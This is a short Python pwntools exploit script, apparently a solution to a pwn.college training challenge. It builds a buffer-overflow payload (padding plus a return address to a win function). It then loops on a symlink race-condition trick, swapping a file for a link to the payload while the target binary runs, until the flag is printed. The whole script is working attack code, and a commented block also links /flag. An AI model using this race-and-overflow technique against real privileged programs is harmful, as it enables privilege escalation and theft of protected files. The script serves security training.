#!/bin/python

import os
import sys
import time
import string
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

WIN_ADDR   = 0x4012d6
BUFFER_LEN = 0x198
EX_NAME = '/home/hacker/maze/exploit'

FILE = '/home/hacker/maze/file'
LONG_PATH = ('/home/hacker/maze/' 
           + '_end/root/'.join(list(string.printable[:11]))[:-1] 
           + 'file')


argv = ['nice', '-n19', sys.argv[1], LONG_PATH]


try:
    with open(EX_NAME, 'xb') as exploit:
        exploit.write(b'X' * BUFFER_LEN)
        exploit.write(p64(WIN_ADDR))
except Exception as ex:
    print(ex)

'''
try:
    os.unlink(FILE)
except:
    pass
os.symlink('/flag', FILE)

start = time.time()
proc = process(argv)
proc.poll(block=True)
secs = time.time() - start - 0.02
print("Time: " + str(secs))

os.unlink(FILE)
'''

while True:
    os.system('touch ' + FILE)
    proc = process(argv)
    time.sleep(0.02)

    os.unlink(FILE)
    os.symlink(EX_NAME, FILE)

    try:
        proc.recvuntil(b"pwn.college")
        print(proc.recvline())
        break
    except EOFError as _:
        os.unlink(FILE)
        pass


exit(0)
proc.interactive()
